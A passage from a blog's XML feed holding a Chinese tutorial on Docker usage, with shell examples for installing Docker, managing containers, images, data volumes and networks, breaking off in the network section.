<li><a href="https://segmentfault.com/a/1190000006913195">Linux Namespace系列（07）：user namespace (CLONE_NEWUSER) (第一部分)</a></li>
<li><a href="http://www.07net01.com/2017/01/1778663.html">理解Docker容器网络之Linux Network Namespace</a></li>
<li><a href="http://coolshell.cn/articles/17010.html">DOCKER基础技术：LINUX NAMESPACE（上）</a></li>
<li><a href="http://coolshell.cn/articles/17029.html">DOCKER基础技术：LINUX NAMESPACE（下）</a></li>
<li><a href="http://blog.chinaunix.net/uid-20788636-id-5029770.html">调整docker中rootfs的分区大小</a></li>
<li><a href="http://blog.csdn.net/horsefoot/article/details/51731543">docker容器资源配额控制</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>namespace</tag>
        <tag>cgroup</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker使用介绍</title>
    <url>/2016/12/26/container/docker/docker-usage/</url>
    <content><![CDATA[<p><img src="/images/docker/docker-vs-vms.jpg" alt="docker-vs-vms"></p>
<h1 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h1><h2 id="Linux部署"><a href="#Linux部署" class="headerlink" title="Linux部署"></a>Linux部署</h2><p>（由于Linux发行版众多，本文以RHEL7.2为例）</p>
<h3 id="单机版环境docker部署"><a href="#单机版环境docker部署" class="headerlink" title="单机版环境docker部署"></a>单机版环境docker部署</h3><p>通过yum源安装docker，<code>yum install docker</code>。</p>
<p>安装完成后，使用<code>docker version</code>查看docker客户端和服务端版本号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker version</span></span><br><span class="line">Client:</span><br><span class="line"> Version:      1.12.5</span><br><span class="line"> API version:  1.24</span><br><span class="line"> Go version:   go1.6.4</span><br><span class="line"> Git commit:   7392c3b</span><br><span class="line"> Built:        Fri Dec 16 02:23:59 2016</span><br><span class="line"> OS/Arch:      linux/amd64</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Version:      1.12.5</span><br><span class="line"> API version:  1.24</span><br><span class="line"> Go version:   go1.6.4</span><br><span class="line"> Git commit:   7392c3b</span><br><span class="line"> Built:        Fri Dec 16 02:23:59 2016</span><br><span class="line"> OS/Arch:      linux/amd64</span><br></pre></td></tr></table></figure>

<h3 id="分布式环境docker部署"><a href="#分布式环境docker部署" class="headerlink" title="分布式环境docker部署"></a>分布式环境docker部署</h3><p>详细请见：<a href="https://docs.docker.com/engine/installation/linux/rhel/">docker官网关于linux环境安装部分</a></p>
<h2 id="MacOS部署"><a href="#MacOS部署" class="headerlink" title="MacOS部署"></a>MacOS部署</h2><p>从Docker官网上下载<code>Docker.dmg</code>（下载地址：<code>https://www.docker.com/products/docker#/mac</code>），并安装。</p>
<p>安装完成后，使用<code>docker version</code>查看docker客户端和服务端版本号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker version</span></span><br><span class="line">Client:</span><br><span class="line"> Version:      1.12.5</span><br><span class="line"> API version:  1.24</span><br><span class="line"> Go version:   go1.6.4</span><br><span class="line"> Git commit:   7392c3b</span><br><span class="line"> Built:        Fri Dec 16 06:14:34 2016</span><br><span class="line"> OS/Arch:      darwin/amd64</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Version:      1.12.5</span><br><span class="line"> API version:  1.24</span><br><span class="line"> Go version:   go1.6.4</span><br><span class="line"> Git commit:   7392c3b</span><br><span class="line"> Built:        Fri Dec 16 06:14:34 2016</span><br><span class="line"> OS/Arch:      linux/amd64</span><br></pre></td></tr></table></figure>

<h1 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h1><h2 id="容器创建-删除"><a href="#容器创建-删除" class="headerlink" title="容器创建&amp;删除"></a>容器创建&amp;删除</h2><h3 id="docker-create"><a href="#docker-create" class="headerlink" title="docker create"></a>docker create</h3><p>使用<code>docker create &#123;选项&#125; &#123;镜像ID/镜像名称&#125; &#123;COMMAND&#125;</code>创建容器，返回容器ID</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker create -i -t --name=ubu my_ubuntu_03 /bin/bash</span></span><br><span class="line">1af8ed9b04f8b16d264418038e1f4004b1f5512f229059646a5c9b1d20ed8404</span><br></pre></td></tr></table></figure>

<h3 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h3><p>使用<code>docker run &#123;选项&#125; &#123;镜像ID/镜像名称&#125; &#123;COMMMAND&#125;</code>创建并运行容器，run ＝ create ＋ start。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h3><p>使用<code>docker rm &#123;容器ID／容器名称&#125;</code>删除已经停止的容器，使用<code>-f</code>参数，可删除正在运行中的容器。</p>
<h2 id="容器查询"><a href="#容器查询" class="headerlink" title="容器查询"></a>容器查询</h2><h3 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h3><p>使用<code>docker ps</code>列出所有运行中的容器，带<code>-a</code>参数，可列出所有容器（包括非运行状态的容器）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS                    PORTS                   NAMES</span><br><span class="line">1af8ed9b04f8        my_ubuntu_03        &quot;/bin/bash&quot;            2 minutes ago       Up 3 seconds                                      ubu</span><br><span class="line">ebe0ce381aaf        my_ubuntu_03        &quot;/usr/sbin/sshd -D&quot;    42 hours ago        Up 42 hours               0.0.0.0:50022-&gt;22/tcp   ubu_03_sshd</span><br><span class="line">e69e9d4cdfa3        my_ubuntu_01        &quot;/bin/bash&quot;            43 hours ago        Exited (0) 42 hours ago                           ubu_01</span><br><span class="line">0fa200a32e8e        ceph/daemon         &quot;/entrypoint.sh osd&quot;   47 hours ago        Up 47 hours                                       ceph-osd</span><br><span class="line">be0583fade06        ceph/daemon         &quot;/entrypoint.sh mon&quot;   4 days ago          Up 47 hours                                       ceph-mon</span><br></pre></td></tr></table></figure>

<h3 id="docker-inspect"><a href="#docker-inspect" class="headerlink" title="docker inspect"></a>docker inspect</h3><p>使用<code>docker inspect &#123;容器ID／容器名称&#125;</code>查看容器详细信息(容器详细信息以JSON格式返回)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker inspect ubu_03_sshd</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">            &quot;Id&quot;: &quot;ebe0ce381aafa73ec679ec0dc38e8d54291378693146a65d3655dd574c76ec01&quot;,</span><br><span class="line">            &quot;Created&quot;: &quot;2016-12-26T08:00:56.73955094Z&quot;,</span><br><span class="line">            &quot;Path&quot;: &quot;/usr/sbin/sshd&quot;,</span><br><span class="line">            &quot;Args&quot;: [</span><br><span class="line">                &quot;-D&quot;</span><br><span class="line">            ],</span><br><span class="line">......</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="容器启停"><a href="#容器启停" class="headerlink" title="容器启停"></a>容器启停</h2><p>使用<code>docker start/stop &#123;容器ID／容器名称&#125;</code>启动或停止容器运行。</p>
<h2 id="容器访问"><a href="#容器访问" class="headerlink" title="容器访问"></a>容器访问</h2><h3 id="在容器内执行命令"><a href="#在容器内执行命令" class="headerlink" title="在容器内执行命令"></a>在容器内执行命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">exec</span> ubu ps -ef</span></span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root         1     0  0 07:01 ?        00:00:00 /bin/bash</span><br><span class="line">root        10     0  0 07:02 ?        00:00:00 ps -ef</span><br></pre></td></tr></table></figure>

<h3 id="Attach-Detach容器"><a href="#Attach-Detach容器" class="headerlink" title="Attach&#x2F;Detach容器"></a>Attach&#x2F;Detach容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker attach ubu</span></span><br><span class="line">root@1af8ed9b04f8:/#</span><br></pre></td></tr></table></figure>
<p>Detach容器时，只要在command line中输入exit即可，但detach时，会导致容器停止运行。所以若不想导致容器停止运行可以使用<code>docker exec -it ubu /bin/bash</code></p>
<h1 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h1><h2 id="镜像创建"><a href="#镜像创建" class="headerlink" title="镜像创建"></a>镜像创建</h2><h3 id="创建新镜像-Dockerfile"><a href="#创建新镜像-Dockerfile" class="headerlink" title="创建新镜像(Dockerfile)"></a>创建新镜像(Dockerfile)</h3><p>使用Dockerfile创建镜像，首先需要选择基础镜像，然后撰写dockerfile，最后使用<code>docker build -t &#123;new image name&#125;:&#123;new image tag&#125; [-f &#123;dockerfile&#125;] .</code>创建Image</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -t new_image_ubu03:v1 -f ./dockerfile/tmp.docker .</span></span><br><span class="line">Sending build context to Docker daemon 317.7 MB</span><br><span class="line">Step 1 : FROM my_ubuntu_03</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">28b69113a240</span></span><br><span class="line">Step 2 : MAINTAINER xxx xx &quot;x.xxx@xxxx.com&quot;</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> ae3004ef2bd2</span></span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">68ab9a056fbf</span></span><br><span class="line">Removing intermediate container ae3004ef2bd2</span><br><span class="line">Successfully built 68ab9a056fbf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">new_image_ubu03     v1                  68ab9a056fbf        14 seconds ago      304.4 MB</span><br><span class="line">my_ubuntu_01        v1                  e1aace2f9532        46 hours ago        304.4 MB</span><br><span class="line">my_ubu              base                31184d4c3c2c        47 hours ago        317.7 MB</span><br><span class="line">my_ubuntu_03        latest              28b69113a240        3 days ago          304.4 MB</span><br><span class="line">my_ubuntu_01        latest              800c37009cde        3 days ago          270 MB</span><br><span class="line">ubuntu              latest              104bec311bcd        2 weeks ago         128.9 MB</span><br><span class="line">ceph/daemon         latest              c06ccf521c4e        6 weeks ago         1.078 GB</span><br></pre></td></tr></table></figure>
<p>关于dockerfile的撰写请见<a href="https://zhoubofsy.github.io/2016/12/30/container/docker/dockerfile-write/">《Dockerfile》</a></p>
<h3 id="基于已有镜像创建新镜像"><a href="#基于已有镜像创建新镜像" class="headerlink" title="基于已有镜像创建新镜像"></a>基于已有镜像创建新镜像</h3><p>使用<code>docker commit &#123;容器名称/容器ID&#125; &#123;RESPOSITORY&#125;&lt;TAG&gt;</code>用已有容器创建镜像。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker commit ubu_01 my_ubuntu_01:v1</span></span><br><span class="line">sha256:e1aace2f953280326b96f31708ddf8f9f02289845e997736fcb1d0342777c72f</span><br></pre></td></tr></table></figure>

<h3 id="从docker-hub上下载新镜像"><a href="#从docker-hub上下载新镜像" class="headerlink" title="从docker hub上下载新镜像"></a>从docker hub上下载新镜像</h3><p>在docker hub上有很多镜像，供使用者下载，用户可以使用<code>docker search</code>查询要下载的镜像，然后使用<code>docker pull</code>下载镜像。 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker pull hello-world</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">Digest: sha256:0256e8a36e2070f7bf2d0b0763dbabdd67798512411de4cdcf9431a1feb60fd9</span><br><span class="line">Status: Image is up to date for hello-world:latest</span><br></pre></td></tr></table></figure>

<h2 id="镜像查询"><a href="#镜像查询" class="headerlink" title="镜像查询"></a>镜像查询</h2><h3 id="查询本地镜像"><a href="#查询本地镜像" class="headerlink" title="查询本地镜像"></a>查询本地镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">my_ubu              base                31184d4c3c2c        7 seconds ago       317.7 MB</span><br><span class="line">my_ubuntu_03        latest              28b69113a240        47 hours ago        304.4 MB</span><br><span class="line">my_ubuntu_01        latest              800c37009cde        2 days ago          270 MB</span><br><span class="line">ubuntu              latest              104bec311bcd        12 days ago         128.9 MB</span><br><span class="line">ceph/daemon         latest              c06ccf521c4e        5 weeks ago         1.078 GB</span><br><span class="line">hello-world         latest              c54a2cc56cbb        5 months ago        1.848 kB</span><br></pre></td></tr></table></figure>

<h3 id="查询镜像详细信息"><a href="#查询镜像详细信息" class="headerlink" title="查询镜像详细信息"></a>查询镜像详细信息</h3><p>使用<code>docker inspect &#123;IMAGE ID/REPOSITORY&#125;&lt;:&#123;TAG&#125;&gt;</code>查询镜像库的详细信息，TAG默认为“latest”。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker inspect my_ubu:base</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">           &quot;Id&quot;: &quot;sha256:31184d4c3c2cbbc56e087dfff68cad2d2d89d628a260f6789baf108345cd6c9b&quot;,</span><br><span class="line">                    &quot;RepoTags&quot;: [</span><br><span class="line">                        &quot;my_ubu:base&quot;</span><br><span class="line">                    ],</span><br><span class="line">           &quot;RepoDigests&quot;: [],</span><br><span class="line">           &quot;Parent&quot;: &quot;&quot;,</span><br><span class="line">           &quot;Comment&quot;: &quot;Imported from -&quot;,</span><br><span class="line">           &quot;Created&quot;: &quot;2016-12-28T07:30:31.500350508Z&quot;,</span><br><span class="line">           &quot;Container&quot;: &quot;&quot;,</span><br><span class="line">           &quot;ContainerConfig&quot;: &#123;</span><br><span class="line">......</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="查询hub上的镜像"><a href="#查询hub上的镜像" class="headerlink" title="查询hub上的镜像"></a>查询hub上的镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker search ceph</span></span><br><span class="line">NAME                        DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">ceph/daemon                 Image containing all the Ceph daemons           29                   [OK]</span><br><span class="line">ceph/demo                                                                   10                   [OK]</span><br><span class="line">ceph/osd                    Ceph OSD (object storage daemon)                6                    [OK]</span><br><span class="line">ceph/base                   Ceph base image                                 5                    [OK]</span><br><span class="line">ceph/radosgw                Ceph RADOSGW (S3/Swift-like service for Ceph)   4                    [OK]</span><br><span class="line">cdxvirt/ceph-daemon         All-in-one container for cdxvirt ceph core...   2                    [OK]</span><br><span class="line">ceph/config                 Ceph bootstrap (configuration)                  2                    [OK]</span><br><span class="line">ceph/rbd                    Ceph rbd (RADOS block device) CLI tool          2                    [OK]</span><br><span class="line">ceph/mds                    Ceph MDS (metadata server)                      2                    [OK]</span><br><span class="line">ulexus/ceph-osd             DEPRECATED:  development is now at ceph/osd     2                    [OK]</span><br><span class="line">ceph/mon                    Ceph MON (monitor daemon)                       1                    [OK]</span><br><span class="line">h0tbird/ceph                Containerized Ceph distributed file system      1                    [OK]</span><br><span class="line">ceph/rados                  Ceph rados (reliable autonomic distributed...   1                    [OK]</span><br><span class="line">cdxvirt/ceph-base           Ceph base container image                       1                    [OK]</span><br><span class="line">qnib/ceph-base              QNIBTerminal ceph base image                    0                    [OK]</span><br><span class="line">qnib/ceph-mono              Monolithic approach of an CEPH cluster + r...   0                    [OK]</span><br><span class="line">fernandosanchez/ceph-dash   ceph-dash                                       0                    [OK]</span><br><span class="line">ceph/install-utils          Install wrappers for common Ceph utility p...   0                    [OK]</span><br><span class="line">qnib/ceph-mon               QNIBTerminal CEPH monitoring Image              0                    [OK]</span><br><span class="line">cephbuilder/ceph            Docker image for building custom Ceph daem...   0                    [OK]</span><br><span class="line">qnib/d-ceph-fuse            QNIBTerminal image (debian) mounting /ceph...   0                    [OK]</span><br><span class="line">ulexus/ceph-mon             DEPRECATED:  development is now at ceph/mon     0                    [OK]</span><br><span class="line">fmeppo/ceph-daemon          Main container for Ceph in Docker.              0                    [OK]</span><br><span class="line">fmeppo/ceph-base            Base container for Ceph in Docker.              0                    [OK]</span><br><span class="line">xenopathic/ceph-keystone    Automated full-stack Ceph environment with...   0                    [OK]</span><br></pre></td></tr></table></figure>

<h2 id="镜像删除"><a href="#镜像删除" class="headerlink" title="镜像删除"></a>镜像删除</h2><p>使用<code>docker rmi &#123;REPOSITORY/IMAGE ID&#125;</code>删除镜像。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker rmi hello-world</span></span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:0256e8a36e2070f7bf2d0b0763dbabdd67798512411de4cdcf9431a1feb60fd9</span><br><span class="line">Deleted: sha256:c54a2cc56cbb2f04003c1cd4507e118af7c0d340fe7e2720f70976c4b75237dc</span><br><span class="line">Deleted: sha256:a02596fdd012f22b03af6ad7d11fa590c57507558357b079c3e8cebceb4262d7</span><br></pre></td></tr></table></figure>

<h2 id="镜像导出导入"><a href="#镜像导出导入" class="headerlink" title="镜像导出导入"></a>镜像导出导入</h2><h3 id="save-load"><a href="#save-load" class="headerlink" title="save &amp; load"></a>save &amp; load</h3><p>只用于镜像（image）的导入导出文件</p>
<h3 id="export-import"><a href="#export-import" class="headerlink" title="export &amp; import"></a>export &amp; import</h3><ul>
<li>export用于容易导出成文件</li>
<li>import用于文件导入成镜像（image）</li>
</ul>
<h3 id="关系图"><a href="#关系图" class="headerlink" title="关系图"></a>关系图</h3><p><img src="/images/docker/docker_save_load_export_import.jpg" alt="import_export"></p>
<h1 id="Volume"><a href="#Volume" class="headerlink" title="Volume"></a>Volume</h1><h2 id="数据卷创建、删除、查询、权限"><a href="#数据卷创建、删除、查询、权限" class="headerlink" title="数据卷创建、删除、查询、权限"></a>数据卷创建、删除、查询、权限</h2><h3 id="创建-权限"><a href="#创建-权限" class="headerlink" title="创建&amp;权限"></a>创建&amp;权限</h3><p>*** docker在创建容器时，可以创建数据卷；一旦容器运行后，就不能动态添加数据卷。若想添加需要重新创建容器。***</p>
<h4 id="私有数据卷创建"><a href="#私有数据卷创建" class="headerlink" title="私有数据卷创建"></a>私有数据卷创建</h4><p>在<code>docker run/create</code>时，使用<code>-v &#123;容器内路径&#125;</code>参数在容器内创建指定的目录，并映射到其宿主机<code>/var/lib/docker/volumes/&#123;ID&#125;/_data</code>的路径下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据卷创建</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -it --name=ubu2 -v=/home/zhoub/docker/data ubuntu /bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据卷查询</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dccker inspect ubu2</span></span><br><span class="line">...</span><br><span class="line">        &quot;Mounts&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;95868b7e6fd47927cfb7f54b35057545f4302d69ed92aa73425dffc289527b6b&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;/var/lib/docker/volumes/95868b7e6fd47927cfb7f54b35057545f4302d69ed92aa73425dffc289527b6b/_data&quot;,</span><br><span class="line">                &quot;Destination&quot;: &quot;/home/zhoub/docker/data&quot;,</span><br><span class="line">                &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="共享数据卷创建"><a href="#共享数据卷创建" class="headerlink" title="共享数据卷创建"></a>共享数据卷创建</h4><p>在<code>docker run/create</code>时，使用<code>-v &#123;宿主机路径:容器内路径:访问权限(ro/rw,默认是RW)&#125;</code>参数挂载数据目录或文件到容器内，宿主机与容器共享该目录，无论宿主机还是容器修改该目录后，另一方也能看到改变。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据卷创建</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -it --name=ubu -v=/home/zhoub/docker/data:/data ubuntu /bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据卷查询</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker inspect ubu</span></span><br><span class="line">...</span><br><span class="line">        &quot;Mounts&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Source&quot;: &quot;/home/zhoub/docker/data&quot;,</span><br><span class="line">                &quot;Destination&quot;: &quot;/data&quot;,</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;rprivate&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="数据卷删除"><a href="#数据卷删除" class="headerlink" title="数据卷删除"></a>数据卷删除</h3><ul>
<li>仅使用<code>docker rm</code>删除容器，会导致数据卷无法删除，仍占用硬盘空间</li>
<li>使用<code>docker rm -v</code>删除容器和数据卷</li>
</ul>
<h2 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h2><h3 id="创建数据卷容器"><a href="#创建数据卷容器" class="headerlink" title="创建数据卷容器"></a>创建数据卷容器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -v /vol --name voldata ubuntu <span class="built_in">echo</span> <span class="string">&quot;Data Container&quot;</span></span></span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker create -v /vol --name voldata ubuntu <span class="built_in">echo</span> <span class="string">&quot;Data Container&quot;</span></span></span><br></pre></td></tr></table></figure>
<p>注：</p>
<ul>
<li>数据卷容器不需要运行，运行会白浪费系统资源</li>
<li>不要下载微小镜像创建数据卷容器，只使用本机所带的镜像即可，不需要咱用额外的存储空间。</li>
</ul>
<h3 id="使用数据卷容器"><a href="#使用数据卷容器" class="headerlink" title="使用数据卷容器"></a>使用数据卷容器</h3><p>在<code>docker run</code>中使用<code>--volumes-from</code>参数为新建的容器挂载voldata数据卷容器中的<code>/vol</code>目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --volumes-from voldata -it --name testContainer ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure>

<h2 id="数据卷备份"><a href="#数据卷备份" class="headerlink" title="数据卷备份"></a>数据卷备份</h2><p>将数据卷容器中数据卷里的数据备份到指定目录中</p>
<p>步骤：</p>
<ol>
<li>创建备份目录</li>
<li>创建容器映射备份目录到容器内，并挂载数据卷容器</li>
<li>在容器中将数据卷容器中的数据copy到映射的备份目录内</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> /tmp/backup</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --<span class="built_in">rm</span> --volumes-from voldata -v /tmp/backup:/backup ubuntu tar cvf /backup/voldata.tar /vol</span></span><br></pre></td></tr></table></figure>

<p>看到此处估计你已经要骂娘了，什么破Docker，连个卷管理接口都没有！以上是老版本中docker对卷的管理方法。接下来说一下新版本中docker对卷的管理。<br>** 一条华丽的分割线… **</p>
<h2 id="新的数据卷管理"><a href="#新的数据卷管理" class="headerlink" title="新的数据卷管理"></a>新的数据卷管理</h2><ul>
<li>卷创建<br>  <code>docker volume create &#123;options&#125;</code>，创建卷，可指定卷名称和访问卷所使用的驱动。目前docker volume plugin支持的驱动包括：blockbridge、convoy、flocker、glusterfs、horcrux、ipfs、netshare、openstorage、quobyte</li>
<li>卷查询<br>  <code>docker volume ls</code>，显示卷列表<br>  <code>docker volume inspect &#123;volume name&#125;</code>，显示指定卷的详细信息</li>
<li>卷删除<br>  <code>docker rm &#123;volume name&#125;</code>，删除指定卷，若卷已经被容器所加载，无论容器是否出于运行状态，删除都会失败。</li>
</ul>
<p>*** 很可惜docker新版本中还是不支持动态加载卸载数据卷 ***</p>
<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><p>docker 有三种网络bridge、host、none。</p>
<ul>
<li>bridge 桥接网络</li>
<li>host 复制宿主机网络</li>
<li>none 无网络，容器只有一个回环地址</li>
</ul>
<h2 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h2><h3 id="网络创建"><a href="#网络创建" class="headerlink" title="网络创建"></a>网络创建</h3><h4 id="bridge"><a href="#bridge" class="headerlink" title="bridge"></a>bridge</h4><p>可通过<code>docker network create --subnet &#123;CIDR&#125; &#123;network name&#125;</code>创建bridge网络 </p>
<h4 id="host"><a href="#host" class="headerlink" title="host"></a>host</h4><p>默认docker会提供一个host网络，用户不能再手动创建该网络<code>Error response from daemon: only one instance of &quot;host&quot; network is allowed</code></p>
<h4 id="none"><a href="#none" class="headerlink" title="none"></a>none</h4><p>该网络不可自创建</p>
<h3 id="网络删除"><a href="#网络删除" class="headerlink" title="网络删除"></a>网络删除</h3><p>可使用<code>docker network rm &#123;network name&#125;</code>删除指定网络</p>
<h3 id="网络查询"><a href="#网络查询" class="headerlink" title="网络查询"></a>网络查询</h3><p>使用<code>docker network ls</code>查看网络列表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker network <span class="built_in">ls</span></span></span><br><span class="line">ETWORK ID          NAME                DRIVER              SCOPE</span><br><span class="line">852c90cb4a48        bridge              bridge              local</span><br><span class="line">bebda2efe6dc        host                host                local</span><br><span class="line">6a69c0cd935e        my_net              bridge              local</span><br><span class="line">09cf35b0a2fe        none                null                local</span><br></pre></td></tr></table></figure>

<p>使用<code>docker network inspect &#123;network name&#125;</code>查看指定网络信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker network inspect my_net</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Name&quot;: &quot;my_net&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;6a69c0cd935ef315d143f1253634b8cce2b20e8e330ce791d53d26a6a08c387f&quot;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;bridge&quot;,</span><br><span class="line">        &quot;EnableIPv6&quot;: false,</span><br><span class="line">        &quot;IPAM&quot;: &#123;</span><br><span class="line">            &quot;Driver&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">            &quot;Config&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Subnet&quot;: &quot;192.168.100.0/24&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;192.168.100.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Internal&quot;: false,</span><br><span class="line">        &quot;Containers&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Options&quot;: &#123;</span><br><span class="line">            &quot;com.docker.network.bridge.name&quot;: &quot;my_net&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="网络使用"><a href="#网络使用" class="headerlink" title="网络使用"></a>网络使用</h2><h3 id="with-‘–network’"><a href="#with-‘–network’" class="headerlink" title="with ‘–network’"></a>with ‘–network’</h3><p>在<code>docker create/run</code>时，指定<code>--network &#123;network name&#125;</code>参数，默认网络使用<code>bridge</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -it --name net_1 --network my_net my_ubuntu_03 /bin/bash</span></span><br></pre></td></tr></table></figure>

<h3 id="container复制"><a href="#container复制" class="headerlink" title="container复制"></a>container复制</h3><p>使用<code>--network container:&#123;容器名称／容器ID&#125;</code>将指定容器的网络及主机名复制到新容器内。</p>
<p>创建‘net_4’容器，并复制‘net_1’的network</p>
